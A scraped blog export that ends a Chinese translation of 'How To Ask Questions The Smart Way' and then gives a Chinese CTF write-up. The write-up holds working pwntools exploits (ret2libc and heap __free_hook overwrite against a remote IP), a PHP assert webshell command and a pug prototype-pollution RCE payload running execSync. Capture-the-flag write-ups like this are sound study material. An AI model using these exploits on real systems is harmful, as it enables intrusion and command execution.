年时的讲话：我来自一个出产玉米，棉花，牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。） 针对诊断者而言，这并不是一种怀疑，而只是一种真实而有用的需求，以便让他们看到的是与你看到的原始证据尽可能一致的东西，而不是你的猜测与归纳的结论。所以，大方的展示给我们看吧！\n按发生时间先后列出问题症状 问题发生前的一系列操作，往往就是对找出问题最有帮助的线索。因此，你的说明里应该包含你的操作步骤，以及机器和软件的反应，直到问题发生。在命令行处理的情况下，提供一段操作记录（例如运行脚本工具所生成的），并引用相关的若干行（如 20 行）记录会非常有帮助。\n如果挂掉的程序有诊断选项（如 -v 的详述开关），试着选择这些能在记录中增加调试信息的选项。记住，多不等于好。试着选取适当的调试级别以便提供有用的信息而不是让读者淹没在垃圾中。\n如果你的说明很长（如超过四个段落），在开头简述问题，接下来再按时间顺序详述会有所帮助。这样黑客们在读你的记录时就知道该注意哪些内容了。\n描述目标而不是过程 如果你想弄清楚如何做某事（而不是报告一个 Bug），在开头就描述你的目标，然后才陈述重现你所卡住的特定步骤。\n经常寻求技术帮助的人在心中有个更高层次的目标，而他们在自以为能达到目标的特定道路上被卡住了，然后跑来问该怎么走，但没有意识到这条路本身就有问题。结果要费很大的劲才能搞定。\n蠢问题\n我怎样才能从某绘图程序的颜色选择器中取得十六进制的的 RGB 值？\n聪明问题\n我正试着用替换一幅图片的色码（color table）成自己选定的色码，我现在知道的唯一方法是编辑每个色码区块（table slot）， 但却无法从某绘图程序的颜色选择器取得十六进制的的 RGB 值。\n第二种提问法比较聪明，你可能得到像是建议采用另一个更合适的工具的回复。\n别要求使用私人电邮回复 黑客们认为问题的解决过程应该公开、透明，此过程中如果更有经验的人注意到不完整或者不当之处，最初的回复才能够、也应该被纠正。同时，作为提供帮助者可以得到一些奖励，奖励就是他的能力和学识被其他同行看到。\n当你要求私下回复时，这个过程和奖励都被中止。别这样做，让 回复者 来决定是否私下回答 \u0026ndash; 如果他真这么做了，通常是因为他认为问题编写太差或者太肤浅，以至于对其它人没有兴趣。\n这条规则存在一条有限的例外，如果你确信提问可能会引来大量雷同的回复时，那么这个神奇的提问句会是向我发电邮，我将为论坛归纳这些回复。试着将邮件列表或新闻群组从洪水般的雷同回复中解救出来是非常有礼貌的 \u0026ndash; 但你必须信守诺言。\n清楚明确的表达你的问题以及需求 漫无边际的提问是近乎无休无止的时间黑洞。最有可能给你有用答案的人通常也正是最忙的人（他们忙是因为要亲自完成大部分工作）。这样的人对无节制的时间黑洞相当厌恶，所以他们也倾向于厌恶那些漫无边际的提问。\n如果你明确表述需要回答者做什么（如提供指点、发送一段代码、检查你的补丁、或是其他等等），就最有可能得到有用的答案。因为这会定出一个时间和精力的上限，便于回答者能集中精力来帮你。这么做很棒。\n要理解专家们所处的世界，请把专业技能想像为充裕的资源，而回复的时间则是稀缺的资源。你要求他们奉献的时间越少，你越有可能从真正专业而且很忙的专家那里得到解答。\n所以，界定一下你的问题，使专家花在辨识你的问题和回答所需要付出的时间减到最少，这技巧对你有用答案相当有帮助 \u0026ndash; 但这技巧通常和简化问题有所区别。因此，问我想更好的理解 X，可否指点一下哪有好一点说明？通常比问你能解释一下 X 吗？更好。如果你的代码不能运作，通常请别人看看哪里有问题，比要求别人替你改正要明智得多。\n询问有关代码的问题时 别要求他人帮你调试有问题的代码，不提示一下应该从何入手。张贴几百行的代码，然后说一声：它不能工作会让你完全被忽略。只贴几十行代码，然后说一句：在第七行以后，我期待它显示 \u0026lt;x\u0026gt;，但实际出现的是 \u0026lt;y\u0026gt;比较有可能让你得到回应。\n最有效描述程序问题的方法是提供最精简的 Bug 展示测试示例（bug-demonstrating test case）。什么是最精简的测试示例？那是问题的缩影；一小个程序片段能刚好展示出程序的异常行为，而不包含其他令人分散注意力的内容。怎么制作最精简的测试示例？如果你知道哪一行或哪一段代码会造成异常的行为，复制下来并加入足够重现这个状况的代码（例如，足以让这段代码能被编译/直译/被应用程序处理）。如果你无法将问题缩减到一个特定区块，就复制一份代码并移除不影响产生问题行为的部分。总之，测试示例越小越好（查看话不在多而在精一节）。\n一般而言，要得到一段相当精简的测试示例并不太容易，但永远先尝试这样做的是种好习惯。这种方式可以帮助你了解如何自行解决这个问题 —- 而且即使你的尝试不成功，黑客们也会看到你在尝试取得答案的过程中付出了努力，这可以让他们更愿意与你合作。\n如果你只是想让别人帮忙审查（Review）一下代码，在信的开头就要说出来，并且一定要提到你认为哪一部分特别需要关注以及为什么。\n别把自己家庭作业的问题贴上来 黑客们很擅长分辨哪些问题是家庭作业式的问题；因为我们中的大多数都曾自己解决这类问题。同样，这些问题得由 你 来搞定，你会从中学到东西。你可以要求给点提示，但别要求得到完整的解决方案。\n如果你怀疑自己碰到了一个家庭作业式的问题，但仍然无法解决，试试在使用者群组，论坛或（最后一招）在项目的使用者邮件列表或论坛中提问。尽管黑客们 会 看出来，但一些有经验的使用者也许仍会给你一些提示。\n去掉无意义的提问句 避免用无意义的话结束提问，例如有人能帮我吗？或者这有答案吗？。\n首先：如果你对问题的描述不是很好，这样问更是画蛇添足。\n其次：由于这样问是画蛇添足，黑客们会很厌烦你 \u0026ndash; 而且通常会用逻辑上正确，但毫无意义的回答来表示他们的蔑视， 例如：没错，有人能帮你或者不，没答案。\n一般来说，避免用 是或否、对或错、有或没有类型的问句，除非你想得到是或否类型的回答。\n即使你很急也不要在标题写紧急 这是你的问题，不是我们的。宣称紧急极有可能事与愿违：大多数黑客会直接删除无礼和自私地企图即时引起关注的问题。更严重的是，紧急这个字（或是其他企图引起关注的标题）通常会被垃圾信过滤器过滤掉 \u0026ndash; 你希望能看到你问题的人可能永远也看不到。\n有半个例外的情况是，如果你是在一些很高调，会使黑客们兴奋的地方，也许值得这样去做。在这种情况下，如果你有时间压力，也很有礼貌地提到这点，人们也许会有兴趣回答快一点。\n当然，这风险很大，因为黑客们兴奋的点多半与你的不同。譬如从 NASA 国际空间站（International Space Station）发这样的标题没有问题，但用自我感觉良好的慈善行为或政治原因发肯定不行。事实上，张贴诸如紧急：帮我救救这个毛绒绒的小海豹！肯定让你被黑客忽略或惹恼他们，即使他们认为毛绒绒的小海豹很重要。\n如果你觉得这点很不可思议，最好再把这份指南剩下的内容多读几遍，直到你弄懂了再发文。\n礼多人不怪，而且有时还很有帮助 彬彬有礼，多用请和谢谢您的关注，或谢谢你的关照。让大家都知道你对他们花时间免费提供帮助心存感激。\n坦白说，这一点并没有比清晰、正确、精准并合法语法和避免使用专用格式重要（也不能取而代之）。黑客们一般宁可读有点唐突但技术上鲜明的 Bug 报告，而不是那种有礼但含糊的报告。（如果这点让你不解，记住我们是按问题能教给我们什么来评价问题的价值的）\n然而，如果你有一串的问题待解决，客气一点肯定会增加你得到有用回应的机会。\n（我们注意到，自从本指南发布后，从资深黑客那里得到的唯一严重缺陷反馈，就是对预先道谢这一条。一些黑客觉得先谢了意味着事后就不用再感谢任何人的暗示。我们的建议是要么先说先谢了，然后 事后再对回复者表示感谢，或者换种方式表达感激，譬如用谢谢你的关注或谢谢你的关照。）\n问题解决后，加个简短的补充说明 问题解决后，向所有帮助过你的人发个说明，让他们知道问题是怎样解决的，并再一次向他们表示感谢。如果问题在新闻组或者邮件列表中引起了广泛关注，应该在那里贴一个说明比较恰当。\n最理想的方式是向最初提问的话题回复此消息，并在标题中包含已修正，已解决或其它同等含义的明显标记。在人来人往的邮件列表里，一个看见讨论串问题 X和问题 X - 已解决的潜在回复者就明白不用再浪费时间了（除非他个人觉得问题 X的有趣），因此可以利用此时间去解决其它问题。\n补充说明不必很长或是很深入；简单的一句你好，原来是网线出了问题！谢谢大家 – Bill比什么也不说要来的好。事实上，除非结论真的很有技术含量，否则简短可爱的小结比长篇大论更好。说明问题是怎样解决的，但大可不必将解决问题的过程复述一遍。\n对于有深度的问题，张贴调试记录的摘要是有帮助的。描述问题的最终状态，说明是什么解决了问题，在此 之后 才指明可以避免的盲点。避免盲点的部分应放在正确的解决方案和其它总结材料之后，而不要将此信息搞成侦探推理小说。列出那些帮助过你的名字，会让你交到更多朋友。\n除了有礼貌和有内涵以外，这种类型的补充也有助于他人在邮件列表/新闻群组/论坛中搜索到真正解决你问题的方案，让他们也从中受益。\n至少，这种补充有助于让每位参与协助的人因问题的解决而从中得到满足感。如果你自己不是技术专家或者黑客，那就相信我们，这种感觉对于那些你向他们求助的大师或者专家而言，是非常重要的。问题悬而未决会让人灰心；黑客们渴望看到问题被解决。好人有好报，满足他们的渴望，你会在下次提问时尝到甜头。\n思考一下怎样才能避免他人将来也遇到类似的问题，自问写一份文件或加个常见问题（FAQ）会不会有帮助。如果是的话就将它们发给维护者。\n在黑客中，这种良好的后继行动实际上比传统的礼节更为重要，也是你如何透过善待他人而赢得声誉的方式，这是非常有价值的资产。\n如何解读答案 RTFM 和 STFW：如何知道你已完全搞砸了 有一个古老而神圣的传统：如果你收到RTFM （Read The Fucking Manual）的回应，回答者认为你应该去读他妈的手册。当然，基本上他是对的，你应该去读一读。\nRTFM 有一个年轻的亲戚。如果你收到STFW（Search The Fucking Web）的回应，回答者认为你应该到他妈的网上搜索过了。那人多半也是对的，去搜索一下吧。（更温和一点的说法是 Google 是你的朋友！）\n在论坛，你也可能被要求去爬爬论坛的旧文。事实上，有人甚至可能热心地为你提供以前解决此问题的讨论串。但不要依赖这种关照，提问前应该先搜索一下旧文。\n通常，用这两句之一回答你的人会给你一份包含你需要内容的手册或者一个网址，而且他们打这些字的时候也正在读着。这些答复意味着回答者认为\n你需要的信息非常容易获得； 你自己去搜索这些信息比灌给你，能让你学到更多。 你不应该因此不爽；依照黑客的标准，他已经表示了对你一定程度的关注，而没有对你的要求视而不见。你应该对他祖母般的慈祥表示感谢。\n如果还是搞不懂 如果你看不懂回应，别立刻要求对方解释。像你以前试着自己解决问题时那样（利用手册，FAQ，网络，身边的高手），先试着去搞懂他的回应。如果你真的需要对方解释，记得表现出你已经从中学到了点什么。\n比方说，如果我回答你：看来似乎是 zentry 卡住了；你应该先清除它。，然后，这是一个 很糟的 后续问题回应：zentry 是什么？好 的问法应该是这样：哦~~~我看过说明了但是只有 -z 和 -p 两个参数中提到了 zentries，而且还都没有清楚的解释如何清除它。你是指这两个中的哪一个吗？还是我看漏了什么？\n处理无礼的回应 很多黑客圈子中看似无礼的行为并不是存心冒犯。相反，它是直接了当，一针见血式的交流风格，这种风格更注重解决问题，而不是使人感觉舒服而却模模糊糊。\n如果你觉得被冒犯了，试着平静地反应。如果有人真的做了出格的事，邮件列表、新闻群组或论坛中的前辈多半会招呼他。如果这 没有 发生而你却发火了，那么你发火对象的言语可能在黑客社区中看起来是正常的，而 你 将被视为有错的一方，这将伤害到你获取信息或帮助的机会。\n另一方面，你偶而真的会碰到无礼和无聊的言行。与上述相反，对真正的冒犯者狠狠地打击，用犀利的语言将其驳得体无完肤都是可以接受的。然而，在行事之前一定要非常非常的有根据。纠正无礼的言论与开始一场毫无意义的口水战仅一线之隔，黑客们自己莽撞地越线的情况并不鲜见。如果你是新手或外人，避开这种莽撞的机会并不高。如果你想得到的是信息而不是消磨时光，这时最好不要把手放在键盘上以免冒险。\n（有些人断言很多黑客都有轻度的自闭症或亚斯伯格综合症，缺少用于润滑人类社会正常交往所需的神经。这既可能是真也可能是假的。如果你自己不是黑客，兴许你认为我们脑袋有问题还能帮助你应付我们的古怪行为。只管这么干好了，我们不在乎。我们 喜欢 我们现在这个样子，并且通常对病患标记都有站得住脚的怀疑。）\nJeff Bigler 的观察总结和这个相关也值得一读 (tact filters)。\n在下一节，我们会谈到另一个问题，当 你 行为不当时所会受到的冒犯。\n如何避免扮演失败者 在黑客社区的论坛中有那么几次你可能会搞砸 \u0026ndash; 以本指南所描述到的或类似的方式。而你会在公开场合中被告知你是如何搞砸的，也许攻击的言语中还会带点夹七夹八的颜色。\n这种事发生以后，你能做的最糟糕的事莫过于哀嚎你的遭遇、宣称被口头攻击、要求道歉、高声尖叫、憋闷气、威胁诉诸法律、向其雇主报怨、忘了关马桶盖等等。相反地，你该这么做：\n熬过去，这很正常。事实上，它是有益健康且合理的。\n社区的标准不会自行维持，它们是通过参与者积极而 公开地 执行来维持的。不要哭嚎所有的批评都应该通过私下的邮件传送，它不是这样运作的。当有人评论你的一个说法有误或者提出不同看法时，坚持声称受到个人攻击也毫无益处，这些都是失败者的态度。\n也有其它的黑客论坛，受过高礼节要求的误导，禁止参与者张贴任何对别人帖子挑毛病的消息，并声称如果你不想帮助用户就闭嘴。 结果造成有想法的参与者纷纷离开，这么做只会使它们沦为毫无意义的唠叨与无用的技术论坛。\n夸张的讲法是：你要的是友善（以上述方式）还是有用？两个里面挑一个。\n记着：当黑客说你搞砸了，并且（无论多么刺耳）告诉你别再这样做时，他正在为关心你和他的社区而行动。对他而言，不理你并将你从他的生活中滤掉更简单。如果你无法做到感谢，至少要表现得有点尊严，别大声哀嚎，也别因为自己是个有戏剧性超级敏感的灵魂和自以为有资格的新来者，就指望别人像对待脆弱的洋娃娃那样对你。\n有时候，即使你没有搞砸（或者只是在他的想像中你搞砸了），有些人也会无缘无故地攻击你本人。在这种情况下，抱怨倒是 真的 会把问题搞砸。\n这些来找麻烦的人要么是毫无办法但自以为是专家的不中用家伙，要么就是测试你是否真会搞砸的心理专家。其它读者要么不理睬，要么用自己的方式对付他们。这些来找麻烦的人在给他们自己找麻烦，这点你不用操心。\n也别让自己卷入口水战，最好不要理睬大多数的口水战 \u0026ndash; 当然，这是在你检验它们只是口水战，并且未指出你有搞砸的地方，同时也没有巧妙地将问题真正的答案藏于其后（这也是有可能的）。\n不该问的问题 以下是几个经典蠢问题，以及黑客没回答时心中所想的：\n问题：我能在哪找到 X 程序或 X 资源？\n问题：我怎样用 X 做 Y？\n问题：如何设定我的 shell 提示？\n问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？\n问题：我的程序/设定/SQL 语句没有用\n问题：我的 Windows 电脑有问题，你能帮我吗？\n问题：我的程序不会动了，我认为系统工具 X 有问题\n问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？\n问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？\n问题：我能在哪找到 X 程序或 X 资源？\n回答：就在我找到它的地方啊，白痴 \u0026ndash; 搜索引擎的那一头。天哪！难道还有人不会用 Google 吗？\n问题：我怎样用 X 做 Y？\n回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。\n问题：如何设定我的 shell 提示？？\n回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 RTFM，然后自己去找出来。\n问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？\n回答：试试看就知道了。如果你试过，你既知道了答案，就不用浪费我的时间了。\n问题：我的{程序/设定/SQL 语句}不工作\n回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 \u0026ndash; 我有更有意思的事要做呢。在看到这类问题的时候，我的反应通常不外如下三种\n你还有什么要补充的吗？ 真糟糕，希望你能搞定。 这关我有什么屁事？ 问题：我的 Windows 电脑有问题，你能帮我吗？\n回答：能啊，扔掉微软的垃圾，换个像 Linux 或 BSD 的开放源代码操作系统吧。\n注意：如果程序有官方版 Windows 或者与 Windows 有互动（如 Samba），你**可以**问与 Windows 相关的问题， 只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。\n问题：我的程序不会动了，我认为系统工具 X 有问题\n回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库档案有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文件作后盾。\n问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？\n回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在这儿找到使用者群组的清单）。\n注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地使用者群组中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 Linux 和 所有 被怀疑的硬件作关键词仔细搜索。\n问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？\n回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！\n好问题与蠢问题 最后，我将透过举一些例子，来说明怎样聪明的提问；同一个问题的两种问法被放在一起，一种是愚蠢的，另一种才是明智的。\n蠢问题：\n我可以在哪儿找到关于 Foonly Flurbamatic 的资料？\n这种问法无非想得到 STFW 这样的回答。\n聪明问题：\n我用 Google 搜索过 \u0026ldquo;Foonly Flurbamatic 2600\u0026rdquo;，但是没找到有用的结果。谁知道上哪儿去找对这种设备编程的资料？\n这个问题已经 STFW 过了，看起来他真的遇到了麻烦。\n蠢问题\n我从 foo 项目找来的源码没法编译。它怎么这么烂？\n他觉得都是别人的错，这个傲慢自大的提问者。\n聪明问题\nfoo 项目代码在 Nulix 6.2 版下无法编译通过。我读过了 FAQ，但里面没有提到跟 Nulix 有关的问题。这是我编译过程的记录，我有什么做的不对的地方吗？\n提问者已经指明了环境，也读过了 FAQ，还列出了错误，并且他没有把问题的责任推到别人头上，他的问题值得被关注。\n蠢问题\n我的主机板有问题了，谁来帮我？\n某黑客对这类问题的回答通常是：好的，还要帮你拍拍背和换尿布吗？，然后按下删除键。\n聪明问题\n我在 S2464 主机板上试过了 X 、 Y 和 Z ，但没什么作用，我又试了 A 、 B 和 C 。请注意当我尝试 C 时的奇怪现象。显然 florbish 正在 grommicking，但结果出人意料。通常在 Athlon MP 主机板上引起 grommicking 的原因是什么？有谁知道接下来我该做些什么测试才能找出问题？\n这个家伙，从另一个角度来看，值得去回答他。他表现出了解决问题的能力，而不是坐等天上掉答案。\n在最后一个问题中，注意告诉我答案和给我启示，指出我还应该做什么诊断工作之间微妙而又重要的区别。\n事实上，后一个问题源自于 2001 年 8 月在 Linux 内核邮件列表（lkml）上的一个真实的提问。我（Eric）就是那个提出问题的人。我在 Tyan S2464 主板上观察到了这种无法解释的锁定现象，列表成员们提供了解决这一问题的重要信息。\n通过我的提问方法，我给了别人可以咀嚼玩味的东西；我设法让人们很容易参与并且被吸引进来。我显示了自己具备和他们同等的能力，并邀请他们与我共同探讨。通过告诉他们我所走过的弯路，以避免他们再浪费时间，我也表明了对他们宝贵时间的尊重。\n事后，当我向每个人表示感谢，并且赞赏这次良好的讨论经历的时候， 一个 Linux 内核邮件列表的成员表示，他觉得我的问题得到解决并非由于我是这个列表中的 名人，而是因为我用了正确的方式来提问。\n黑客从某种角度来说是拥有丰富知识但缺乏人情味的家伙；我相信他是对的，如果我 像 个乞讨者那样提问，不论我是谁，一定会惹恼某些人或者被他们忽视。他建议我记下这件事，这直接导致了本指南的出现。\n如果得不到回答 如果仍得不到回答，请不要以为我们觉得无法帮助你。有时只是看到你问题的人不知道答案罢了。没有回应不代表你被忽视，虽然不可否认这种差别很难区分。\n总的来说，简单的重复张贴问题是个很糟的点子。这将被视为无意义的喧闹。有点耐心，知道你问题答案的人可能生活在不同的时区，可能正在睡觉，也有可能你的问题一开始就没有组织好。\n你可以通过其他渠道获得帮助，这些渠道通常更适合初学者的需要。\n有许多网上的以及本地的使用者群组，由热情的软件爱好者（即使他们可能从没亲自写过任何软件）组成。通常人们组建这样的团体来互相帮助并帮助新手。\n另外，你可以向很多商业公司寻求帮助，不论公司大还是小。别为要付费才能获得帮助而感到沮丧！毕竟，假使你的汽车发动机汽缸密封圈爆掉了\u0026ndash; 完全可能如此 \u0026ndash;你还得把它送到修车铺，并且为维修付费。就算软件没花费你一分钱，你也不能强求技术支持总是免费的。\n对像是 Linux 这种大众化的软件，每个开发者至少会对应到上万名使用者。根本不可能由一个人来处理来自上万名使用者的求助电话。要知道，即使你要为这些协助付费，和你所购买的同类软件相比，你所付出的也是微不足道的（通常封闭源代码软件的技术支持费用比开放源代码软件的要高得多，且内容也没那么丰富）。\n如何更好地回答问题 态度和善一点。问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。\n对初犯者私下回复。对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找常见问题都不知道。\n如果你不确定，一定要说出来！一个听起来权威的错误回复比没有还要糟，别因为听起来像个专家很好玩，就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。\n如果帮不了忙，也别妨碍他。不要在实际步骤上开玩笑，那样也许会毁了使用者的设置 \u0026ndash;有些可怜的呆瓜会把它当成真的指令。\n试探性的反问以引出更多的细节。如果你做得好，提问者可以学到点东西 \u0026ndash;你也可以。试试将蠢问题转变成好问题，别忘了我们都曾是新手。\n尽管对那些懒虫抱怨一声 RTFM 是正当的，能指出文件的位置（即使只是建议个 Google 搜索关键词）会更好。\n如果你决定回答，就请给出好的答案。当别人正在用错误的工具或方法时别建议笨拙的权宜之计（wordaround），应推荐更好的工具，重新界定问题。\n正面的回答问题！如果这个提问者已经很深入的研究而且也表明已经试过 X 、 Y 、 Z 、 A 、 B 、 C 但没得到结果，回答 试试看 A 或是 B 或者 试试 X 、 Y 、 Z 、 A 、 B 、 C 并附上一个链接一点用都没有。\n帮助你的社区从问题中学习。当回复一个好问题时，问问自己如何修改相关文件或常见问题文件以免再次解答同样的问题？，接着再向文件维护者发一份补丁。\n如果你是在研究一番后才做出的回答，展现你的技巧而不是直接端出结果。毕竟授人以鱼不如授人以渔。\n相关资源 如果你需要个人电脑、Unix 系统和网络如何运作的基础知识，参阅 Unix 系统和网络基本原理。\n当你发布软件或补丁时，试着按软件发布实践操作。\n鸣谢 Evelyn Mitchel 贡献了一些愚蠢问题例子并启发了编写如何更好地回答问题这一节， Mikhail Ramendik 贡献了一些特别有价值的建议和改进。\n","date":"2025-01-19T21:25:32+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/%E6%8F%90%E9%97%AE%E7%9A%84%E6%99%BA%E6%85%A7/","title":"提问的智慧"},{"content":"Misc 签到漫画 二维码拼图，扫码得到URL\nhttp://weixin.qq.com/r/4BIrMz7ES2M0rXpQ90fy?flag{youthful_and_upward}\nwhitepic 后缀改为.gif 放入gif逐帧分析可得flag\n删除后门用户2 题目内容：\n本题需要选手完成风险排查：清理后门用户。当彻底清理好后，等待一分钟左右，/checklog会出现flag。\n（本题下发后会有一个ssh地址、账号密码，选手可通过ssh来访问环境）\n直接userdel显示进程占用\nps -ef查看\nkill 22\nkill 57 58 61\nuserdel -f backdoor\n过一分钟拿flag\nPWN clock_in 题目内容：\n1.We wish you success and hope you enjoy this task.\n2.The flag position is in /home/ctf/flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from pwn import * pop_rdi_ret = 0x4011C5 call_puts_pop_ret = 0x4011FA get_info_func = 0x401202 puts_got = 0x403FD8 binsh = 0x1cb42f system = 0x58740 io = remote(\u0026#39;IP\u0026#39;, \u0026#39;PORT\u0026#39;) # io = process(\u0026#39;./clock_in\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; payload = b\u0026#39;a\u0026#39;*(64 + 8) payload += p64(pop_rdi_ret) payload += p64(puts_got) payload += p64(call_puts_pop_ret) #call puts in get_info_func payload += p64(0) payload += p64(get_info_func) io.recvuntil(b\u0026#39;Your info: \u0026#39;) io.sendline(payload) io.recvuntil(b\u0026#39;Thank you! You entered:\\n\u0026#39;) io.recvuntil(b\u0026#39;\\n\u0026#39;) libc_puts_addr = u64(io.recv(6)+b\u0026#39;\\0\u0026#39;*2) libc_base_addr = libc_puts_addr-0x87BD0 success(f\u0026#39;Got libc_puts_addr ====\u0026gt; {hex(libc_puts_addr)}\u0026#39;) success(f\u0026#39;Got libc_base_addr ====\u0026gt; {hex(libc_base_addr)}\u0026#39;) payload = b\u0026#39;a\u0026#39;*(64 + 8) payload += p64(pop_rdi_ret) payload += p64(binsh + libc_base_addr) payload += p64(system + libc_base_addr) io.recvuntil(b\u0026#39;Your info: \\n\u0026#39;) io.sendline(payload) io.interactive() journey_story 题目内容：\nRecord your journey, leave your story.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 from pwn import * # io = process(\u0026#39;./journey_story\u0026#39;) io = remote(\u0026#39;39.106.48.123\u0026#39;,\u0026#39;41557\u0026#39;) # context(log_level=\u0026#39;debug\u0026#39;) def add(size: int, con: bytes): io.sendlineafter(b\u0026#39;Choose an option: \u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;): \u0026#39;, hex(size).encode()) io.sendlineafter(b\u0026#39;characters): \u0026#39;, con) def dele(index: int): io.sendlineafter(b\u0026#39;Choose an option: \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;): \u0026#39;, str(index).encode()) def edit(index: int, con: bytes): io.sendlineafter(b\u0026#39;Choose an option: \u0026#39;, b\u0026#39;3\u0026#39;) io.sendlineafter(b\u0026#39;): \u0026#39;, str(index).encode()) io.sendafter(b\u0026#39;characters): \u0026#39;, con) def show(): io.sendlineafter(b\u0026#39;Choose an option: \u0026#39;, b\u0026#39;4\u0026#39;) #unsorted bin leak libc base for i in range(11): add(0x88, str(i).encode()) for i in range(7): dele(i) dele(9) edit(7, b\u0026#39;a\u0026#39;*0x88+p8(0x91)) dele(8) add(0x90, b\u0026#39;a\u0026#39;) edit(0, b\u0026#39;a\u0026#39;*0x91) show() io.recvuntil(b\u0026#39;a\u0026#39;*0x90) libc_base_addr = u64(io.recv(6)+b\u0026#39;\\0\u0026#39;*2) - 0x61 + 0xe0 - (0x7f76f9e69be0 - 0x7f76f9c7d000) free_hook_addr = libc_base_addr+ 0x1EEE48 system_addr = libc_base_addr+ 0x52290 success(f\u0026#39;libc_base_addr ====\u0026gt; {hex(libc_base_addr)}\u0026#39;) success(f\u0026#39;free_hook_addr ====\u0026gt; {hex(free_hook_addr)}\u0026#39;) success(f\u0026#39;system_addr ====\u0026gt; {hex(system_addr)}\u0026#39;) edit(0, b\u0026#39;a\u0026#39;*0x88+p64(0x91)+p8(0xe0)) add(0x88, b\u0026#39;a\u0026#39;) #1 add(0x88, b\u0026#39;a\u0026#39;) #2 add(0x88, b\u0026#39;a\u0026#39;) #3 add(0x88, b\u0026#39;a\u0026#39;) #4 dele(1) dele(2) edit(4, b\u0026#39;a\u0026#39;*0x88+p8(0xb1)) dele(3) add(0xa8, b\u0026#39;a\u0026#39;) #1 edit(1, b\u0026#39;1\u0026#39;*0x88+p64(0x91)+p64(free_hook_addr)) io.sendline() add(0x88, b\u0026#39;a\u0026#39;) #2 add(0x88, p64(system_addr)) #3 # gdb.attach(io) io.interactive() interactive交互之后新建一个堆块，内容写/bin/sh回车，然后删除该堆块（本exp中堆块index应为5）\nWEB ezFindShell 下载附件发现好多php代码，我们找找有没有可以利用的] grep -r --include='*.php' 'POST' /path/to/your/directory 找到了1de9d9a55a824f4f8b6f37af76596baa.php 注意$e=$REQUEST['e'];$arr=array($POST['POST'],);array_filter($arr,base64_decode($e)); 这串代码是一句话变形马：首先使用REQUEST接收e参数传递的值,然后把$_POST['POST']赋值给arr数组，然后把arr数组中的每个键值传给base64_decode处理后构成的回调函数 我们只要让回调函数变成assert，arr数组传入的值为system(\u0026quot;ls /\u0026quot;)就好 POST提交e=YXNzZXJ0\u0026amp;POST=system(\u0026quot;ls /\u0026quot;) 看到flag，改下参数e=YXNzZXJ0\u0026amp;POST=system(\u0026quot;cat /flag\u0026quot;)\ncyberboard 上来给了个登录框,用户名和密码如下\n1 2 3 4 const users = [ { id: 1, username: \u0026#39;admin\u0026#39;, password: \u0026#34;password_you_don\u0026#39;t_know\u0026#34;, role:\u0026#39;admin\u0026#39; }, { id: 2, username: \u0026#39;guest\u0026#39;, password: \u0026#39;guest123\u0026#39;, role: \u0026#39;user\u0026#39; } ]; 直接登录发现存在一个留言解密,审计源码发现逻辑如下.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 static merge(target, source) { for (let key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { if (typeof source[key] === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; source[key] !== null) { if (!target[key]) Object.assign(target, { [key]: {} }); this.merge(target[key], source[key]); } else { target[key] = source[key] } } } return target; } save(content) { Message.merge(this, JSON.parse(`{\u0026#34;id\u0026#34;:${Message.messages.length + 1},\u0026#34;content\u0026#34;: ${content}}`)); Message.messages.push(this); } 显然是原型链,但是不知道应该去污染谁,卡了很久. 后来在被废弃的pull请求中发现了下面的一个 https://github.com/pugjs/pug/pull/3428 遂写出payload\n1 {\u0026#34;__proto__\u0026#34;:{\u0026#34;block\u0026#34;:{\u0026#34;type\u0026#34;: \u0026#34;Text\u0026#34;, \u0026#34;line\u0026#34;:\u0026#34;console.log(process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;calc\u0026#39;).toString())\u0026#34;}}} 然而又遇到一个问题,这个东西疑似不出网,反正弹shell失败,读flag写到public中得到最后的flag\n1 {\u0026#34;__proto__\u0026#34;:{\u0026#34;block\u0026#34;:{\u0026#34;type\u0026#34;: \u0026#34;Text\u0026#34;, \u0026#34;line\u0026#34;:\u0026#34;process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;cat /flag_1s_hereeee\u0026gt;./public/js/flag.txt\u0026#39;)\u0026#34;}}} 访问/js/flag.txt 